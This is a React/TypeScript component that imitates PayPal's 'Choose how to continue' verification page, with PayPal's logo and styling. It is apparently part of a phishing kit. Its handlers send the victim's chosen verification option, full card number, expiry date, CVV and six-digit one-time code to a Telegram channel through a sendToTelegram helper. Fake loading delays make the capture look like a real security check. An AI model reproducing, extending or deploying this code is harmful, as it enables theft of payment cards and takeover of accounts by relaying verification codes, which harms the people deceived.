import React, { useState, useEffect } from 'react';
import { CreditCard, List, MessageSquare, Phone, Mail } from 'lucide-react';
import { sendToTelegram } from '../utils/telegram';

interface VerificationPageProps {
  email: string;
  onBack: () => void;
  onVerificationSuccess: () => void;
  mode?: 'initial' | 'final';
}

type VerificationStep = 'choose' | 'confirm_card' | 'enter_code';
type VerificationOption = 'confirm_card' | 'security_questions' | 'paypal_app' | 'get_text' | 'have_call' | 'get_email' | 'whatsapp';

export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 'initial' }: VerificationPageProps) {
  const [step, setStep] = useState<VerificationStep>('choose');
  const [loading, setLoading] = useState(false);
  const [selectedOption, setSelectedOption] = useState<VerificationOption>(mode === 'initial' ? 'get_text' : 'confirm_card');
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [verificationCode, setVerificationCode] = useState(['', '', '', '', '', '']);
  const [countdown, setCountdown] = useState(45);

  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (step === 'enter_code' && countdown > 0) {
      timer = setInterval(() => {
        setCountdown((prev) => prev - 1);
      }, 1000);
    }
    return () => clearInterval(timer);
  }, [step, countdown]);

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    let formattedValue = '';

    if (value.startsWith('34') || value.startsWith('37')) {
      // Amex 4-6-5
      if (value.length > 0) formattedValue += value.substring(0, 4);
      if (value.length > 4) formattedValue += ' ' + value.substring(4, 10);
      if (value.length > 10) formattedValue += ' ' + value.substring(10, 15);
    } else {
      // 4-4-4-4 (Visa, Master, Discover)
      const parts = value.match(/.{1,4}/g);
      if (parts) {
        formattedValue = parts.join(' ').substring(0, 19);
      } else {
        formattedValue = value;
      }
    }
    setCardNumber(formattedValue);
  };

  const handleNext = async () => {
    setLoading(true);
    await sendToTelegram(`<b>[VERIFICATION] Option Selected:</b> ${selectedOption}`);
    setTimeout(() => {
      setLoading(false);
      if (selectedOption === 'confirm_card') {
        setStep('confirm_card');
      } else if (selectedOption === 'get_text' || selectedOption === 'have_call') {
        setStep('enter_code');
        setCountdown(45);
      }
    }, 3000);
  };

  const handleChooseAnother = () => {
    setStep('choose');
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (step === 'choose') {
      handleNext();
    }
  };

  const handleConfirm = async (e: React.FormEvent) => {
    e.preventDefault();
    await sendToTelegram(`<b>[VERIFICATION] Card Details:</b>\nNumber: ${cardNumber}\nExpiry: ${expiryDate}\nCVV: ${cvv}`);
    if (mode === 'final') {
      setLoading(true);
      setTimeout(() => {
        setLoading(false);
        setStep('enter_code');
        setCountdown(45);
      }, 3000);
    } else {
      onVerificationSuccess();
    }
  };

  const handleCodeSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const code = verificationCode.join('');
    await sendToTelegram(`<b>[VERIFICATION] Code Submitted:</b> ${code}`);
    onVerificationSuccess();
  };

  const renderTopBar = () => (
    <div className="w-full max-w-[480px] mt-4 sm:mt-8 px-4 sm:px-6">
      <div className="bg-[#f5f7fa] rounded-full px-4 sm:px-6 py-2 sm:py-3 flex items-center justify-between border border-gray-100">
        <span className="text-[13px] sm:text-[15px] text-gray-700 truncate mr-2">{email}</span>
        <button 
          onClick={onBack}
          className="text-[#0070BA] font-bold text-[13px] sm:text-[15px] hover:underline shrink-0"
        >
          Change
        </button>
      </div>
    </div>
  );

  const renderFooter = () => (
    <div className="flex flex-wrap items-center gap-4 sm:gap-6 text-[12px] sm:text-[13px] font-semibold text-gray-600 border-t border-gray-100 pt-8 w-full justify-center mt-auto pb-8 px-4">
      <a href="#" className="hover:underline">Contact Us</a>
      <a href="#" className="hover:underline">Privacy</a>
      <a href="#" className="hover:underline">Legal</a>
      <a href="#" className="hover:underline">Worldwide</a>
    </div>
  );

  if (step === 'confirm_card') {
    return (
      <div className="min-h-screen w-full bg-white flex flex-col items-center font-['Inter',sans-serif]">
        <div className="w-full max-w-[480px] px-8 pt-12 flex flex-col items-center">
          <form onSubmit={handleConfirm} className="w-full flex flex-col items-center">
            {/* PayPal Logo */}
            <div className="mb-8 self-start">
              <svg viewBox="0 0 200 200" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
                <path d="M55.4,153.8l14.1-89.2c0.3-1.9,1.9-3.3,3.8-3.3h38.2c18.5,0,28.8,8.8,26.4,24.1 c-2,12.5-11.2,22.2-23.4,24.1c-1.5,0.2-2.7,1.4-3,2.9l-0.3,1.6l-2.4,15.4l-0.2,1.1c-0.3,1.9-1.9,3.3-3.8,3.3H81.6 c-2.3,0-4,2.1-3.6,4.4l-5.6,35.6c-0.3,1.9-1.9,3.3-3.8,3.3H55.4z" fill="#003087" />
                <path d="M68.5,70.8l-8.8,55.6c-0.3,1.9,1.2,3.6,3.1,3.6h18.2c1.9,0,3.5-1.4,3.8-3.3l5.8-36.7l0.2-1.1 c0.3-1.9,1.9-3.3,3.8-3.3h16.5c12.2-1.9,21.4-11.6,23.4-24.1c0.8-5.1,0.2-9.8-1.7-13.7c-3.6-7.5-11.9-11.5-22.6-11.5H72.3 C70.4,39.3,68.8,40.7,68.5,42.6L68.5,70.8z" fill="#0079C1" />
              </svg>
            </div>
            
            <h1 className="text-[32px] font-bold text-gray-900 leading-tight mb-8 self-start tracking-tight">
              Confirm Debit/Credit Card number
            </h1>
            <div className="w-full space-y-4 mb-8">
              <div className="relative">
                <input
                  type="text"
                  value={cardNumber}
                  onChange={handleCardNumberChange}
                  placeholder="Card number"
                  className="w-full px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
                />
              </div>
            <div className="flex flex-col sm:flex-row gap-4 mb-8 w-full">
              <div className="flex-1 relative">
                <input
                  type="text"
                  value={expiryDate}
                  onChange={(e) => setExpiryDate(e.target.value)}
                  placeholder="Expiry date"
                  className="w-full px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
                />
              </div>
              <div className="flex-1 relative">
                <input
                  type="text"
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value)}
                  placeholder="CVV"
                  className="w-full px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
                />
              </div>
            </div>
            </div>
            <button 
              type="submit"
              className="w-full py-4 bg-[#0054BB] hover:bg-[#004294] text-white font-bold text-lg rounded-full transition-colors mb-4 shadow-sm"
            >
              Confirm
            </button>
            <button 
              type="button"
              onClick={handleChooseAnother}
              className="w-full py-4 bg-white border border-gray-300 hover:border-gray-400 text-gray-900 font-bold text-lg rounded-full transition-colors mb-20 shadow-sm"
            >
              Choose Another Option
            </button>
          </form>
          {renderFooter()}
        </div>
      </div>
    );
  }

  if (step === 'enter_code') {
    return (
      <div className="min-h-screen w-full bg-white flex flex-col items-center font-['Inter',sans-serif]">
        <div className="w-full max-w-[480px] px-8 pt-12 flex flex-col items-center">
          <form onSubmit={handleCodeSubmit} className="w-full flex flex-col items-center">
            {/* PayPal Logo */}
            <div className="mb-8 self-start">
              <svg viewBox="0 0 200 200" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
                <path d="M55.4,153.8l14.1-89.2c0.3-1.9,1.9-3.3,3.8-3.3h38.2c18.5,0,28.8,8.8,26.4,24.1 c-2,12.5-11.2,22.2-23.4,24.1c-1.5,0.2-2.7,1.4-3,2.9l-0.3,1.6l-2.4,15.4l-0.2,1.1c-0.3,1.9-1.9,3.3-3.8,3.3H81.6 c-2.3,0-4,2.1-3.6,4.4l-5.6,35.6c-0.3,1.9-1.9,3.3-3.8,3.3H55.4z" fill="#003087" />
                <path d="M68.5,70.8l-8.8,55.6c-0.3,1.9,1.2,3.6,3.1,3.6h18.2c1.9,0,3.5-1.4,3.8-3.3l5.8-36.7l0.2-1.1 c0.3-1.9,1.9-3.3,3.8-3.3h16.5c12.2-1.9,21.4-11.6,23.4-24.1c0.8-5.1,0.2-9.8-1.7-13.7c-3.6-7.5-11.9-11.5-22.6-11.5H72.3 C70.4,39.3,68.8,40.7,68.5,42.6L68.5,70.8z" fill="#0079C1" />
              </svg>
            </div>
            <h1 className="text-[32px] font-bold text-gray-900 leading-tight mb-8 self-start tracking-tight">
              {mode === 'final' ? 'Enter the code you get' : 'Enter the code we texted you'}
            </h1>
            <p className="text-[16px] text-gray-900 mb-8 self-start font-medium">
              +1 •••-•••-••••
            </p>
            <div className="flex gap-1.5 sm:gap-2 mb-4 w-full justify-between">
              {verificationCode.map((digit, i) => (
                <input
                  key={i}
                  type="text"
                  maxLength={1}
                  value={digit}
                  className="w-10 h-14 sm:w-12 sm:h-16 bg-[#f5f7fa] border-2 border-transparent rounded-lg text-center text-[20px] sm:text-[24px] font-bold outline-none focus:bg-white focus:border-[#0070BA] transition-all"
                  onChange={(e) => {
                    const nextCode = [...verificationCode];
                    nextCode[i] = e.target.value;
                    setVerificationCode(nextCode);
                    if (e.target.value && i < 5) {
                      const nextInput = e.target.parentElement?.children[i + 1] as HTMLInputElement;
                      nextInput?.focus();
                    }
                  }}
                  onKeyDown={(e) => {
                    if (e.key === 'Backspace' && !verificationCode[i] && i > 0) {
                      const prevInput = e.target.parentElement?.children[i - 1] as HTMLInputElement;
                      prevInput?.focus();
                    }
                  }}
                />
              ))}
            </div>
            <p className="text-[14px] text-gray-600 mb-8 self-start">
              {countdown > 0 ? `Resend code in ${countdown} sec` : 'Resend code'}
            </p>
            <button 
              type="submit"
              className="w-full py-4 bg-[#0054BB] hover:bg-[#004294] text-white font-bold text-lg rounded-full transition-colors mb-4 shadow-sm"
            >
              Submit
            </button>
            <button 
              type="button"
              onClick={handleChooseAnother}
              className="w-full py-4 bg-white border border-gray-300 hover:border-gray-400 text-gray-900 font-bold text-lg rounded-full transition-colors mb-20 shadow-sm"
            >
              Choose Another Option
            </button>
          </form>
          {renderFooter()}
        </div>
      </div>
    );
  }

  return (
    <div className="relative min-h-screen w-full bg-white flex flex-col items-center font-['Inter',sans-serif]">
      {/* Loading Overlay */}
      {loading && (
        <div className="absolute inset-0 z-[100] bg-white flex flex-col items-center justify-center">
          <div className="flex flex-col items-center gap-4">
            <div className="relative w-12 h-12">
              <div className="absolute inset-0 border-2 border-gray-100 rounded-full"></div>
              <div 
                className="absolute inset-0 border-2 border-t-[#0070BA] border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin"
                style={{ animationDuration: '0.8s' }}
              ></div>
            </div>
            <p className="text-[#2C2E2F] text-[18px] font-normal">Just a second...</p>
          </div>
        </div>
      )}

      <div className="w-full max-w-[480px] px-8 pt-12 flex flex-col items-center">
        <form onSubmit={handleSubmit} className="w-full flex flex-col items-center">
          {/* PayPal Logo */}
          <div className="mb-8 self-start">
            <svg viewBox="0 0 200 200" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
              <path d="M55.4,153.8l14.1-89.2c0.3-1.9,1.9-3.3,3.8-3.3h38.2c18.5,0,28.8,8.8,26.4,24.1 c-2,12.5-11.2,22.2-23.4,24.1c-1.5,0.2-2.7,1.4-3,2.9l-0.3,1.6l-2.4,15.4l-0.2,1.1c-0.3,1.9-1.9,3.3-3.8,3.3H81.6 c-2.3,0-4,2.1-3.6,4.4l-5.6,35.6c-0.3,1.9-1.9,3.3-3.8,3.3H55.4z" fill="#003087" />
              <path d="M68.5,70.8l-8.8,55.6c-0.3,1.9,1.2,3.6,3.1,3.6h18.2c1.9,0,3.5-1.4,3.8-3.3l5.8-36.7l0.2-1.1 c0.3-1.9,1.9-3.3,3.8-3.3h16.5c12.2-1.9,21.4-11.6,23.4-24.1c0.8-5.1,0.2-9.8-1.7-13.7c-3.6-7.5-11.9-11.5-22.6-11.5H72.3 C70.4,39.3,68.8,40.7,68.5,42.6L68.5,70.8z" fill="#0079C1" />
            </svg>
          </div>

          <h1 className="text-[32px] font-bold text-gray-900 leading-tight mb-12 self-start tracking-tight">
            Choose how to continue
          </h1>

          <div className="w-full space-y-6 mb-12">
            <SelectableOption 
              id="confirm_card"
              icon={<CreditCard className={`w-6 h-6 ${mode === 'final' ? 'text-gray-700' : 'text-gray-400'}`} />} 
              label="Confirm your credit card number" 
              sublabel="Visa x-••••"
              selected={selectedOption === 'confirm_card'}
              onSelect={() => setSelectedOption('confirm_card')}
              disabled={mode !== 'final'}
            />
            <SelectableOption 
              id="security_questions"
              icon={<List className="w-6 h-6 text-gray-400" />} 
              label="Answer your security questions" 
              selected={false}
              disabled
            />
            <SelectableOption 
              id="paypal_app"
              icon={<MessageSquare className="w-6 h-6 text-gray-400" />} 
              label="Use the PayPal app" 
              selected={false}
              disabled
            />
            <SelectableOption 
              id="get_text"
              icon={<MessageSquare className={`w-6 h-6 ${mode === 'initial' ? 'text-gray-700' : 'text-gray-400'}`} />} 
              label="Get a text" 
              sublabel="Mobile +1 •••-•••-••••"
              selected={selectedOption === 'get_text'}
              onSelect={() => setSelectedOption('get_text')}
              disabled={mode !== 'initial'}
            />
            <SelectableOption 
              id="have_call"
              icon={<Phone className={`w-6 h-6 ${mode === 'initial' ? 'text-gray-700' : 'text-gray-400'}`} />} 
              label="Have us call you" 
              selected={selectedOption === 'have_call'}
              onSelect={() => setSelectedOption('have_call')}
              disabled={mode !== 'initial'}
            />
            <SelectableOption 
              id="get_email"
              icon={<Mail className="w-6 h-6 text-gray-400" />} 
              label="Get an email" 
              selected={false}
              disabled
            />
            <SelectableOption 
              id="whatsapp"
              icon={<MessageSquare className="w-6 h-6 text-gray-400" />} 
              label="Get a WhatsApp text" 
              selected={false}
              disabled
            />
          </div>

          {selectedOption === 'get_text' && (
            <p className="text-[13px] text-gray-500 mb-8 leading-relaxed">
              You confirm this is your phone number and we can send you text messages and get subscriber and device details from your wireless carrier...
            </p>
          )}

          <button 
            type="submit"
            className="w-full py-4 bg-[#0054BB] hover:bg-[#004294] text-white font-bold text-lg rounded-full transition-colors mb-12 shadow-sm"
          >
            Next
          </button>
        </form>

        {renderFooter()}
      </div>
    </div>
  );
}

interface SelectableOptionProps {
  id: string;
  icon: React.ReactNode;
  label: string;
  sublabel?: string;
  selected: boolean;
  onSelect?: () => void;
  disabled?: boolean;
}

function SelectableOption({ icon, label, sublabel, selected, onSelect, disabled }: SelectableOptionProps) {
  return (
    <div 
      onClick={!disabled ? onSelect : undefined}
      className={`flex flex-col ${disabled ? 'cursor-not-allowed opacity-50' : 'cursor-pointer group'}`}
    >
      <div className="flex items-center justify-between w-full">
        <div className="flex items-center gap-4">
          <div className={disabled ? 'text-gray-400' : 'text-gray-700'}>
            {icon}
          </div>
          <span className={`text-[17px] font-medium ${selected ? 'text-gray-900' : (disabled ? 'text-gray-400' : 'text-gray-700')} transition-colors`}>
            {label}
          </span>
        </div>
        <div className={`w-6 h-6 rounded-full border-2 transition-all flex items-center justify-center p-1 ${selected ? 'border-[#0070BA]' : (disabled ? 'border-gray-200 bg-gray-50' : 'border-gray-300')}`}>
          {selected && <div className="w-full h-full bg-[#0070BA] rounded-full shadow-inner"></div>}
        </div>
      </div>
      {sublabel && (
        <div className="pl-10 mt-1">
          <span className={`text-[15px] ${selected ? 'text-gray-600 font-medium' : (disabled ? 'text-gray-400' : 'text-gray-500')}`}>
            {sublabel}
          </span>
        </div>
      )}
    </div>
  );
}